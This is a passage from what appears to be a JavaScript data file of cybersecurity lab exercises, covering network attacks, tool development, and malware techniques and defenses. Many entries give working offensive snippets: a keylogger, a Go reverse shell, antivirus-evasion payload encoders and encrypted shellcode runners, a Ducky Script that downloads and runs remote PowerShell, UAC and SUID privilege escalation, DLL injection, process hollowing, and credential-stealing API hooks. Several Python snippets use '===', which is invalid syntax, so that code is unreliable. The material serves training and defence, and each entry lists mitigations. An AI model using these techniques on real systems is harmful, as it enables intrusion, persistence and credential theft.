        description: "Bypass switch isolation boundaries and access other subnet segments using double 802.1Q tagging attacks.",
        guide: {
            objective: "Force switches to forward frames to isolated target VLANs using dual tag frames.",
            labSetup: "A switch utilizing trunking protocols (DTP) with target VLAN subnets.",
            steps: [
                "Establish switch trunk relationships using dynamic trunking protocols (DTP).",
                "Construct network packets using double-tagging configurations (matching native and target VLAN IDs).",
                "Inject packets using yersinia or Scapy.",
                "Verify egress traffic flows reach the target VLAN systems."
            ],
            commands: "Yersinia GUI launch:\nsudo yersinia -G\n\nScapy Double Tag payload snippet:\npkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=10)/IP(dst='10.10.10.5')/ICMP()",
            mitigation: "Disable dynamic trunking (DTP) on ports. Avoid using default Native VLAN 1, and configure all unused switch ports as access ports."
        }
    },

    // Tool Development (35-51)
    {
        id: 35,
        title: "Python TCP Port Scanner",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2-3 Hours",
        xp: 50,
        description: "Write a light, multi-threaded script in Python that probes target hosts for open ports and banners.",
        guide: {
            objective: "Build a socket port scanner in Python supporting multi-threaded targets.",
            labSetup: "Python installed locally; target ports hosting active network services.",
            steps: [
                "Create a Python script importing socket and threading modules.",
                "Define connection sockets targeting specific IP and port combinations.",
                "Implement try/except checks to verify successful handshakes (socket.connect()).",
                "Add multi-threading loops to scan ranges of ports simultaneously."
            ],
            commands: "Python Socket connection code:\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(1.0)\nresult = s.connect_ex(('127.0.0.1', 80))\nif result === 0:\n    print('Port 80 is open!')\ns.close()",
            mitigation: "Secure code auditing: use strong timeouts, handle thread exceptions, and close active socket connections cleanly."
        }
    },
    {
        id: 36,
        title: "Python Keylogger",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "3 Hours",
        xp: 50,
        description: "Build a script that hooks OS keyboard event loops, records inputs, and dumps logs locally.",
        guide: {
            objective: "Create an offline input logger utility using Python libraries.",
            labSetup: "Python installed on a local target machine with keyboard access permissions.",
            steps: [
                "Install keyboard hook packages (e.g. pynput) using pip.",
                "Write listener event callbacks that trigger on key press inputs.",
                "Format logs to readable text strings including system spaces.",
                "Write outputs to hidden background local log text documents."
            ],
            commands: "Pynput setup command:\npip install pynput\n\nListener code block:\nfrom pynput.keyboard import Key, Listener\ndef on_press(key):\n    with open('log.txt', 'a') as f: f.write(str(key) + '\\n')\nwith Listener(on_press=on_press) as l: l.join()",
            mitigation: "Strict user permissions. Deploy host monitoring systems, and block unauthorized software scripts from reading OS APIs."
        }
    },
    {
        id: 37,
        title: "Simple Reverse Shell in Go",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Develop a lightweight Go executable that initiates reverse TCP links and routes shell consoles.",
        guide: {
            objective: "Compile a cross-platform command-and-control connection tool in Go.",
            labSetup: "Go compiler installed on your system; netcat listener open on the receiver port.",
            steps: [
                "Write a Go application utilizing net and os/exec libraries.",
                "Create TCP connections targeting the listener IP and port.",
                "Execute system shell instances (cmd.exe or /bin/sh).",
                "Redirect standard inputs, outputs, and errors from shell streams directly to net socket connections."
            ],
            commands: "Go Shell Connection Code:\nconn, _ := net.Dial(\"tcp\", \"127.0.0.1:4444\")\ncmd := exec.Command(\"/bin/sh\")\ncmd.Stdin = conn\ncmd.Stdout = conn\ncmd.Stderr = conn\ncmd.Run()",
            mitigation: "Monitor system executions starting from unusual network interfaces. Use endpoint detection agents (EDR)."
        }
    },
    {
        id: 38,
        title: "Web Directory Crawler in Python",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Create a directory brute-forcer script that checks HTTP status codes of target list URLs.",
        guide: {
            objective: "Build a custom crawler that tests paths to locate hidden resources and administration portals.",
            labSetup: "Python and requests library installed; local test web target active.",
            steps: [
                "Create a Python program loading request modules.",
                "Load text wordlists containing directory folders.",
                "Loop through path arrays and send HTTP requests targeting root domains.",
                "Filter and output paths returning active status codes (200, 301, 403)."
            ],
            commands: "Python request test:\nimport requests\nurl = 'http://target.local/admin'\nr = requests.get(url, allow_redirects=False)\nif r.status_code === 200:\n    print('Found directory:', url)",
            mitigation: "Configure target systems to rate limit traffic, restrict IP blocks, and monitor web logs for high-frequency scan queries."
        }
    },
    {
        id: 39,
        title: "Base64 & XOR Payload Encoder",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write an encoder tool in Python that obfuscates payload binaries using XOR logic to bypass basic detection.",
        guide: {
            objective: "Obfuscate scripts and executables using custom byte manipulation structures.",
            labSetup: "Python environment; test payload script.",
            steps: [
                "Define a byte-array mapping target payloads.",
                "Write XOR loop operations that modify values using security keys.",
                "Apply Base64 encoding to outputs to ensure string compatibility.",
                "Create stub scripts that reverse modifications dynamically during runtime execution."
            ],
            commands: "Python XOR operation logic:\ndef xor(data, key):\n    return bytearray([b ^ key for b in data])\n# payload = xor(raw_payload, 0x41)",
            mitigation: "Ensure scanning engines analyze system behaviors and execution paths, rather than relying solely on static signature databases."
        }
    },
    {
        id: 40,
        title: "Subdomain DNS Resolver Script",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Develop a Python script that sweeps target domain names to discover active subdomains.",
        guide: {
            objective: "Query target domains to map out host resources.",
            labSetup: "Python environment; dnspython module installed.",
            steps: [
                "Install dnspython packages via pip.",
                "Read subdomain lists from static text dictionaries.",
                "Perform DNS lookup operations (dns.resolver.resolve) for combinations of subdomains.",
                "Output hosts that return valid A-record address assignments."
            ],
            commands: "DNS Query check:\nimport dns.resolver\ntry:\n    ans = dns.resolver.resolve('admin.example.com', 'A')\n    print('Subdomain exists:', ans[0])\nexcept Exception: pass",
            mitigation: "Configure internal systems to limit DNS zone transfers, and disable wildcards on public domains."
        }
    },
    {
        id: 41,
        title: "Scapy Packet Injector",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Construct and inject custom TCP network packets using Scapy scripts.",
        guide: {
            objective: "Build and send custom network packet headers to check target responses.",
            labSetup: "Python and scapy installed locally with administrative access permissions.",
            steps: [
                "Write a Python script importing Scapy libraries.",
                "Configure layers mapping IP and TCP parameters (IP(dst=...) / TCP(dport=...)).",
                "Inject custom data variables inside the packet payload layer.",
                "Execute the send function and monitor responses via tcpdump."
            ],
            commands: "Scapy command line setup:\npip install scapy\n\nScapy custom packet injection:\nfrom scapy.all import *\npkt = IP(dst='192.168.1.1')/TCP(dport=80, flags='S')\nsend(pkt)",
            mitigation: "Configure firewalls to block incoming traffic streams that feature malformed packet headers."
        }
    },
    {
        id: 42,
        title: "PDF Metadata Extractor Tool",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Develop a Python utility that scans PDF documents to extract metadata like creators, tools, and edit histories.",
        guide: {
            objective: "Extract target OS details and creator profiles from PDF document variables.",
            labSetup: "Python and pypdf package installed; test PDF files.",
            steps: [
                "Install PyPDF libraries in the environment.",
                "Write scripts that load documents (PdfReader).",
                "Access dictionary parameters containing file metadata.",
                "Print output parameters (e.g. Creator, Producer, Author)."
            ],
            commands: "Metadata retrieval script:\nfrom pypdf import PdfReader\nreader = PdfReader('test.pdf')\nmeta = reader.metadata\nprint('Author:', meta.author)\nprint('Creator tool:', meta.creator)",
            mitigation: "Sanitize PDF files before publishing them online to prevent leaking internal usernames or server directories."
        }
    },
    {
        id: 43,
        title: "Password Hash Cracker",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Build an offline dictionary hash cracker script that checks wordlist hashes against targets.",
        guide: {
            objective: "Recover plain-text passwords from target hash values.",
            labSetup: "Python environment; standard wordlist text documents.",
            steps: [
                "Import hashlib modules in the script.",
                "Read password wordlists line-by-line.",
                "Calculate hash values of words using MD5 or SHA-256.",
                "Compare generated hashes to the target string to find matches."
            ],
            commands: "Hash crack operation snippet:\nimport hashlib\ntest_hash = hashlib.sha256(b'password').hexdigest()\nif test_hash === target_hash:\n    print('Password found!')",
            mitigation: "Use salted hashing algorithms (bcrypt, Argon2) to make dictionary attacks computationally expensive."
        }
    },
    {
        id: 44,
        title: "HTTP Banner Grabber Tool",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write a tool that checks HTTP response headers to identify server software and versions.",
        guide: {
            objective: "Identify target server software setups by querying system headers.",
            labSetup: "Python environment; local test web target active.",
            steps: [
                "Write a Python script utilizing socket connections.",
                "Connect to target ports and transmit standard HTTP requests (GET / HTTP/1.1).",
                "Receive headers from servers and filter response arrays.",
                "Output specific variables like Server and X-Powered-By."
            ],
            commands: "Raw socket request payload:\ns.sendall(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\nresponse = s.recv(1024)\nprint(response.decode())",
            mitigation: "Disable or mask diagnostic header information in target web server configuration files (e.g., expose Server: Apache instead of specific version tags)."
        }
    },
    {
        id: 45,
        title: "Wireless Beacon Frame Flooder",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Build a script using Scapy that broadcasts thousands of spoofed Wi-Fi beacons to flood scanning devices.",
        guide: {
            objective: "Flood scanning devices by generating spoofed wireless beacon frames.",
            labSetup: "Kali Linux setup; network card supporting wireless packet injection.",
            steps: [
                "Create Scapy script files utilizing Dot11 and Dot11Beacon objects.",
                "Loop through list directories containing fake network SSID names.",
                "Transmit constructed packets over wireless card interfaces.",
                "Verify mock SSIDs pop up on local mobile phone Wi-Fi lists."
            ],
            commands: "Beacon packet generator:\npkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2='00:11:22:33:44:55', addr3='00:11:22:33:44:55')/Dot11Beacon(cap='ESS')/Dot11Elt(ID='SSID', info='FakeNetwork')",
            mitigation: "Configure wireless client filters to flag anomalies, and block untrusted networks."
        }
    },
    {
        id: 46,
        title: "Multi-threaded Link Crawler",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Create a rapid site crawler that indexes web links using multi-threaded request workers.",
        guide: {
            objective: "Audit web applications to catalog pages and identify potential targets.",
            labSetup: "Python setup; beautifulsoup4 and request modules installed.",
            steps: [
                "Parse HTML bodies to locate anchor links (href).",
                "Add found domains to checking queues, preventing duplicate runs.",
                "Deploy thread pools to query links concurrently.",
                "Dump paths to local output files."
            ],
            commands: "Installation command:\npip install beautifulsoup4\n\nLink extraction code:\nfrom bs4 import BeautifulSoup\nsoup = BeautifulSoup(r.text, 'html.parser')\nfor link in soup.find_all('a'):\n    print(link.get('href'))",
            mitigation: "Implement rate-limiting rules and configure CAPTCHAs to detect high-frequency crawlers."
        }
    },
    {
        id: 47,
        title: "MAC Address Changer Script",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write a command-line script in Python that alters network adapter MAC addresses dynamically.",
        guide: {
            objective: "Write an automation tool that updates MAC parameters on specified network interfaces.",
            labSetup: "Python environment; subprocess modules mapping system execution paths.",
            steps: [
                "Import subprocess modules in Python.",
                "Write functions that invoke system interface tools (ifconfig / ip).",
                "Execute terminal commands disabling interfaces, updating MAC addresses, and restarting connections.",
                "Implement validation checks to confirm adapter variables update successfully."
            ],
            commands: "Subprocess interface call:\nimport subprocess\nsubprocess.call(['ip', 'link', 'set', 'dev', 'eth0', 'down'])\nsubprocess.call(['ip', 'link', 'set', 'dev', 'eth0', 'address', '00:11:22:33:44:55'])",
            mitigation: "Secure code review: always validate interface inputs in code to prevent command injections."
        }
    },
    {
        id: 48,
        title: "Nessus API Vulnerability Scanner",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Write a script that interfaces with the Nessus REST API to start scans and download reports.",
        guide: {
            objective: "Automate network security audits using API requests to trigger scanners.",
            labSetup: "Active Nessus vulnerability scanner setup with API keys generated.",
            steps: [
                "Verify API authentication token structures in Nessus admin panels.",
                "Write requests that trigger target scan templates.",
                "Monitor query status checks for scan completions.",
                "Download scan details via JSON responses."
            ],
            commands: "Nessus API POST request:\nheaders = {'X-ApiKeys': 'accessKey=KEY; secretKey=KEY'}\nrequests.post('https://localhost:8834/scans', headers=headers, json=scan_data)",
            mitigation: "Enforce strict IP restrictions and role-based access control on scanner management consoles."
        }
    },
    {
        id: 49,
        title: "Automated SQL Injection Script",
        category: "tool-dev",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Write a script that automates parameter checking on login fields to identify SQL vulnerabilities.",
        guide: {
            objective: "Build an automated testing tool that detects database input validation errors.",
            labSetup: "Python setup; target pages hosting vulnerable database inputs.",
            steps: [
                "Create queries containing testing lists (e.g. single quotes, UNION statements).",
                "Transmit HTTP requests using parameters mapped with the testing lists.",
                "Scan response bodies for SQL database error warnings (e.g., MySQL syntax errors).",
                "Log vulnerable parameters for manual review."
            ],
            commands: "Error check snippet:\nerrors = ['mysql_fetch_array', 'syntax error in SQL', 'PostgreSQL query failed']\nif any(e in r.text for e in errors):\n    print('Vulnerable parameter found!')",
            mitigation: "Use robust input sanitization and enforce parametrized queries across all application database calls."
        }
    },
    {
        id: 50,
        title: "SSH Honeypot Script",
        category: "tool-dev",
        difficulty: "intermediate",
        duration: "3-4 Hours",
        xp: 75,
        description: "Build an SSH honeypot script in Python that logs attempts made by network brute-force bots.",
        guide: {
            objective: "Track network attackers by deploying a simulated SSH service on port 22.",
            labSetup: "Python setup; paramiko library installed; system port 22 mapped to script listener.",
            steps: [
                "Install paramiko libraries to manage SSH parameters.",
                "Deploy socket listeners listening on system ports (e.g. port 22).",
                "Write script callbacks that capture user logins without verifying passwords.",
                "Write attempts, passwords, and source IPs to log text files."
            ],
            commands: "Install Paramiko:\npip install paramiko\n\nSocket bind check:\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0', 22))\ns.listen(100)",
            mitigation: "Ensure default SSH services are placed on non-standard ports, and monitor system connections."
        }
    },
    {
        id: 51,
        title: "ICMP Ping Sweep Script",
        category: "tool-dev",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write a lightweight network discovery script in Bash/Python that pings subnets to find active IPs.",
        guide: {
            objective: "Discover active subnet hosts using ICMP requests.",
            labSetup: "Python/Bash environment; local network space with running devices.",
            steps: [
                "Write network sweeps loops iterating across host ranges (1 to 254).",
                "Format system ping commands sending single request frames (-c 1).",
                "Process output signals checking for returns.",
                "Display IPs that reply to the ping requests."
            ],
            commands: "Bash Sweep script:\nfor ip in {1..254}; do\n  ping -c 1 -W 1 192.168.1.$ip | grep 'bytes from' &\ndone",
            mitigation: "Ensure network scripts validate input boundaries to prevent shell injections."
        }
    },

    // Malware & Defense (52-68)
    {
        id: 52,
        title: "Custom Snort IDS Rule Formulation",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write detection signatures in Snort to alert on suspicious network traffic like Nmap scans or shell connections.",
        guide: {
            objective: "Configure alert signatures to detect malicious traffic on system adapters.",
            labSetup: "Install Snort locally or use predefined sandbox containers mapping interfaces.",
            steps: [
                "Locate Snort config and rule directories (local.rules).",
                "Write a Snort rule that checks for TCP packets targeting specific ports (e.g., port 4444).",
                "Configure rule flags to inspect payload content for malicious strings.",
                "Run Snort on dynamic interfaces to verify alerts trigger when scanning targets."
            ],
            commands: "Snort TCP Scan Detection Rule:\nalert tcp any any -> $HOME_NET 22 (msg:\"SSH Scan Attempt\"; flags:S; sid:1000001; rev:1;)\n\nTest Snort configuration:\nsudo snort -A console -q -c /etc/snort/snort.conf -i eth0",
            mitigation: "Regularly update IDS rule signatures, and monitor networks to investigate alert logs."
        }
    },
    {
        id: 53,
        title: "Registry Run Key Persistence",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Demonstrate malware persistence by configuring Windows Registry Run keys to auto-launch executables.",
        guide: {
            objective: "Establish application persistence by modifying registry configurations.",
            labSetup: "A Windows testing system or VM with administrative shell privileges.",
            steps: [
                "Open Windows PowerShell as an Administrator.",
                "Identify standard Windows startup registry keys (e.g., HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).",
                "Write a registry key mapping to a dummy testing script.",
                "Restart the system and verify the dummy script launches automatically upon user login."
            ],
            commands: "PowerShell registry key creation:\nNew-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'PersistenceTest' -Value 'C:\\Temp\\script.bat' -PropertyType 'String'",
            mitigation: "Restrict access to registry keys. Monitor Run keys for changes using Group Policies or security agents."
        }
    },
    {
        id: 54,
        title: "Buffer Overflow on 32-bit Binary",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "4-5 Hours",
        xp: 100,
        description: "Exploit stack overflows on 32-bit executables using custom inputs to hijack instruction pointers.",
        guide: {
            objective: "Perform local code execution on systems by exploiting memory overflow vulnerabilities.",
            labSetup: "A 32-bit Linux testing system; a target C program compiled with stack protection disabled.",
            steps: [
                "Analyze the target binary program structure to locate buffer vulnerabilities.",
                "Generate custom testing inputs containing padding characters to crash the binary.",
                "Determine instruction pointer offset parameters using pattern calculators.",
                "Construct payload arrays containing shellcode addresses and overwrite EIP targets to execute code."
            ],
            commands: "Disable Linux stack ASLR:\nsudo sysctl -w kernel.randomize_va_space=0\n\nCompile without stack protection:\ngcc -fno-stack-protector -z execstack -m32 vulnerability.c -o vulnerability",
            mitigation: "Enforce compiler protection features (ASLR, DEP, stack canaries), and write memory-safe code."
        }
    },
    {
        id: 55,
        title: "DLL Process Injection Simulation",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 100,
        description: "Simulate process injection attacks by executing APIs to write DLL payloads into target memory.",
        guide: {
            objective: "Inject testing code into active processes using Windows APIs.",
            labSetup: "Windows system environment; C/C++ compiler setup; target process (e.g., notepad.exe) running.",
            steps: [
                "Write C code that opens target processes using OpenProcess.",
                "Allocate virtual memory spaces inside the target processes using VirtualAllocEx.",
                "Write target DLL paths into allocated memory zones using WriteProcessMemory.",
                "Launch remote injection threads using CreateRemoteThread."
            ],
            commands: "C injection sequence calls:\nHANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);\nLPVOID addr = VirtualAllocEx(proc, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);\nWriteProcessMemory(proc, addr, dllPath, pathLen, NULL);\nCreateRemoteThread(proc, NULL, 0, loadLibraryAddr, addr, 0, NULL);",
            mitigation: "Deploy endpoint detection software (EDR) to monitor API calls. Enforce security configurations like Process Mitigations."
        }
    },
    {
        id: 56,
        title: "Splunk Alert Configuration",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Configure Splunk queries to monitor security event logs and alert on failed logins.",
        guide: {
            objective: "Establish automated alert rules in Splunk to flag suspicious account activity.",
            labSetup: "A running Splunk dashboard logging authentication events from system logs.",
            steps: [
                "Write search queries in Splunk (SPL) targeting failed logins.",
                "Apply aggregation rules to identify high-frequency failed login attempts from specific IPs.",
                "Configure automated alert triggers to email administrators when search criteria are met.",
                "Test alert rules by generating multiple failed login attempts on a system."
            ],
            commands: "Splunk failed logins search:\nindex=windows EventCode=4625 | stats count by TargetUserName, SourceNetworkAddress | where count > 5",
            mitigation: "Regularly tune alert thresholds to prevent alert fatigue. Audit authentication mechanisms."
        }
    },
    {
        id: 57,
        title: "Cuckoo Sandbox Malware Check",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze untrusted executables inside Cuckoo Sandbox and review dynamic file reports.",
        guide: {
            objective: "Analyze malware samples safely inside isolated environments.",
            labSetup: "Install Cuckoo Sandbox inside virtual environments hosting isolated guest VMs.",
            steps: [
                "Submit test files to the Cuckoo analyzer interface.",
                "Launch the sandbox and monitor network behavior and system modifications.",
                "Review the generated report to identify signature matches and dropped payloads.",
                "Export results and IOCs (Indicators of Compromise) for security planning."
            ],
            commands: "Submit file to cuckoo:\ncuckoo submit --timeout 120 /path/to/malicious.exe",
            mitigation: "Deploy automated sandboxing tools to scan email attachments and public file downloads."
        }
    },
    {
        id: 58,
        title: "Process Hollowing Execution Lab",
        category: "malware-defense",
        difficulty: "expert",
        duration: "6-8 Hours",
        xp: 150,
        description: "Launch legitimate system binaries in suspended states, hollow their code segments, and inject target payloads.",
        guide: {
            objective: "Perform process masquerading by running payloads inside legitimate system processes.",
            labSetup: "Windows system VM; Visual Studio development environment.",
            steps: [
                "Create a legitimate host process in a suspended state using Windows APIs.",
                "Unmap target memory segments inside the process using NtUnmapViewOfSection.",
                "Write custom payload sections into the allocated process memory spaces.",
                "Update entry point registers and resume the process to execute the code."
            ],
            commands: "API sequence calls:\nCreateProcessA(..., CREATE_SUSPENDED, ...);\nNtUnmapViewOfSection(pi.hProcess, baseAddr);\nVirtualAllocEx(pi.hProcess, ...);\nWriteProcessMemory(pi.hProcess, ...);\nResumeThread(pi.hThread);",
            mitigation: "Utilize system integrity checking APIs. Deploy advanced behavior-monitoring EDR agents to flag process creations starting in suspended modes."
        }
    },
    {
        id: 59,
        title: "Custom YARA Rule Formulation",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Write detection rules in YARA targeting unique strings and hex byte arrays inside ransomware binaries.",
        guide: {
            objective: "Create signature detection parameters to identify threat groups.",
            labSetup: "Install YARA locally; obtain deactivated test malware files.",
            steps: [
                "Examine target binaries in hex editors to locate signature strings.",
                "Formulate YARA rules mapping defined string patterns.",
                "Write execution conditions stating matching requirements.",
                "Run YARA across document directories to scan for matches."
            ],
            commands: "YARA Rule format:\nrule Ransomware_Alert {\n  strings:\n    $a = \"WannaDecryptor\"\n    $b = { 41 41 41 41 }\n  condition:\n    $a or $b\n}\n\nExecute YARA scan:\nyara rule.yar /path/to/files/",
            mitigation: "Deploy YARA rules in security pipelines to audit mail systems, repositories, and local system paths."
        }
    },
    {
        id: 60,
        title: "USB Rubber Ducky Simulation",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Write Ducky Script payloads that emulate human keystrokes to open system terminals and download scripts.",
        guide: {
            objective: "Perform local system updates by simulating keyboard inputs.",
            labSetup: "Ducky script sandbox tool, or a local system executing automated keystroke macros.",
            steps: [
                "Write keystroke scripts using Ducky script commands.",
                "Add system delays to account for hardware initialization.",
                "Write actions that open target terminal consoles and download dummy files.",
                "Execute and test the scripts to verify system modifications."
            ],
            commands: "Ducky Script Example:\nDELAY 1000\nGUI r\nDELAY 200\nSTRING cmd.exe\nENTER\nDELAY 500\nSTRING powershell -c \"iex(New-Object Net.WebClient).DownloadString('http://target/script.ps1')\"\nENTER",
            mitigation: "Block system storage connections. Disable terminal access keys using endpoint group configurations."
        }
    },
    {
        id: 61,
        title: "PrivEsc via Linux SUID Binaries",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Locate and exploit misconfigured SUID binaries to elevate privilege levels to root on Linux.",
        guide: {
            objective: "Elevate user permissions by exploiting vulnerabilities in SUID file configurations.",
            labSetup: "A Linux environment containing system tools (e.g. find, vim) misconfigured with SUID flags.",
            steps: [
                "Scan target directories to find files configured with SUID parameters.",
                "Cross-reference found tools with GTFOBins rules to check for privilege escalation options.",
                "Execute the target tool using specific arguments (e.g., find . -exec /bin/sh -p) to bypass shell restrictions.",
                "Verify user privilege levels elevate to root."
            ],
            commands: "Find SUID binaries:\nfind / -perm -u=s -type f 2>/dev/null\n\nExploit SUID find:\nfind . -exec /bin/sh -p \\; -quit",
            mitigation: "Audit SUID file flags. Regularly update file permissions, and restrict SUID configurations to minimal requirements."
        }
    },
    {
        id: 62,
        title: "Windows UAC Bypass Simulation",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Bypass User Account Control (UAC) prompts on Windows systems using registry manipulation techniques.",
        guide: {
            objective: "Acquire elevated administrative privileges without triggering user authorization prompts.",
            labSetup: "A Windows target system; a local user account configured with admin capabilities.",
            steps: [
                "Locate legitimate Windows executables (e.g. fodhelper.exe) that auto-elevate privileges.",
                "Identify registry paths monitored by the target program (e.g., HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command).",
                "Update target registry key values mapping to custom payload files.",
                "Run the target helper executable to verify execution of the custom payloads in elevated states."
            ],
            commands: "Registry updates in PowerShell:\nNew-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force\nSet-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Name '(Default)' -Value 'C:\\Windows\\System32\\cmd.exe' -Force\nStart-Process 'C:\\Windows\\System32\\fodhelper.exe'",
            mitigation: "Configure UAC settings to 'Always Notify'. Limit administrative user groups to essential personnel."
        }
    },
    {
        id: 63,
        title: "API Hooking for Credential Theft",
        category: "malware-defense",
        difficulty: "expert",
        duration: "6 Hours",
        xp: 150,
        description: "Write a program that intercepts and monitors Windows API calls in memory to steal user credentials.",
        guide: {
            objective: "Intercept and log system calls in memory by implementing custom API hooks.",
            labSetup: "Windows VM; development environment compiled mapping API libraries.",
            steps: [
                "Analyze memory allocations of target APIs to identify entry points.",
                "Inject inline detour variables modifying target function headers.",
                "Redirect execution flows through custom logging functions.",
                "Log credentials from API parameters before resuming original system processes."
            ],
            commands: "C Detour Hook snippet:\n#include <detours.h>\nstatic int (WINAPI * TrueConnect)(...) = targetConnect;\nint WINAPI HookedConnect(...) {\n  // Log data\n  return TrueConnect(...);\n}",
            mitigation: "Ensure software libraries use cryptographic signatures. Deploy endpoint security systems."
        }
    },
    {
        id: 64,
        title: "Memory Forensics using Volatility",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3-4 Hours",
        xp: 75,
        description: "Analyze raw system memory dumps using Volatility to extract process listings, network ports, and passwords.",
        guide: {
            objective: "Reconstruct system events by analyzing memory image files.",
            labSetup: "Volatility tool installed locally; raw memory dumps from Windows systems.",
            steps: [
                "Identify OS profiles corresponding to target memory images.",
                "Generate process listings (pslist) to locate suspicious background executions.",
                "Inspect active connections using netscan to find suspicious external IPs.",
                "Dump registry segments and run credential extraction plugins."
            ],
            commands: "Identify memory profiles:\nvol -f memory.raw windows.info\n\nProcess list scan:\nvol -f memory.raw windows.pslist\n\nExtract network ports:\nvol -f memory.raw windows.netscan",
            mitigation: "Deploy endpoint agents to monitor process spaces and secure memory access configurations."
        }
    },
    {
        id: 65,
        title: "Scheduled Task Persistence Setup",
        category: "malware-defense",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Deploy automated persistence hooks on Windows systems by configuring Scheduled Tasks.",
        guide: {
            objective: "Configure scheduled execution points to maintain access on systems.",
            labSetup: "A Windows VM environment with administrative command access.",
            steps: [
                "Open Windows PowerShell as an Administrator.",
                "Write scheduled task structures stating triggers (e.g. daily, user login).",
                "Bind tasks to execution commands mapping to target scripts.",
                "Verify task execution schedules and confirm persistence behavior."
            ],
            commands: "PowerShell task creation:\n$action = New-ScheduledTaskAction -Execute 'C:\\Windows\\System32\\cmd.exe'\n$trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName 'PersistenceTask' -Action $action -Trigger $trigger -User 'SYSTEM'",
            mitigation: "Restrict permissions to scheduled task folders. Monitor system logs for new task registrations."
        }
    },
    {
        id: 66,
        title: "AV Bypass via Payload Encryption",
        category: "malware-defense",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 100,
        description: "Encrypt shellcode using AES algorithms to bypass antivirus scan signatures, decrypting it dynamically during execution.",
        guide: {
            objective: "Evade static signature detection rules by encrypting binary payloads.",
            labSetup: "A Windows target system running basic AV software; a C/C++ compiler.",
            steps: [
                "Encrypt binary shellcode files using AES keys.",
                "Write C code that allocates executable memory zones (VirtualAlloc).",
                "Decrypt the shellcode block in memory using decryption keys during execution.",
                "Execute the decrypted shellcode using function pointer references."
            ],
            commands: "Virtual memory allocation C logic:\nvoid *exec = VirtualAlloc(0, shellcodeLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy(exec, decryptedShellcode, shellcodeLen);\n((void(*)())exec)();",
            mitigation: "Deploy system-level behavior analysis and monitor memory changes dynamically."
        }
    },
    {
        id: 67,
        title: "Linux Rootkit Kernel Module",
        category: "malware-defense",
        difficulty: "expert",
        duration: "6 Hours",
        xp: 150,
        description: "Write a basic Linux Kernel Module rootkit that intercepts syscall vectors to hide files and processes.",
        guide: {
            objective: "Evade detection on systems by implementing custom kernel modifications.",
            labSetup: "A Linux VM compiled with active kernel headers; root privileges.",
            steps: [
                "Write C code defining kernel modifications.",
                "Intercept system calls (e.g., sys_getdents) to hide files containing target strings.",
                "Compile and load the kernel module (insmod).",
                "Verify files containing the target strings are hidden from listing commands."
            ],
            commands: "Load kernel module:\nsudo insmod rootkit.ko\n\nVerify module listings:\nlsmod | grep rootkit",
            mitigation: "Enable secure boot configurations, restrict kernel loading, and monitor system parameters."
        }
    },
    {
        id: 68,
        title: "Process Masquerading and Name Spoof",
        category: "malware-defense",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Evade detection on Windows systems by running custom payloads that mimic standard system processes like svchost.exe.",
        guide: {
            objective: "Evade analysis on target systems by naming execution files after core processes.",
            labSetup: "Windows system VM; process explorer utilities installed.",
            steps: [
                "Rename custom executable payloads to match core system services (e.g. svchost.exe).",
                "Execute payloads from temp folders using standard system privileges.",
                "Inspect system processes using Process Explorer to verify they blend in.",
                "Analyze process parameters to identify clues like incorrect paths."
            ],
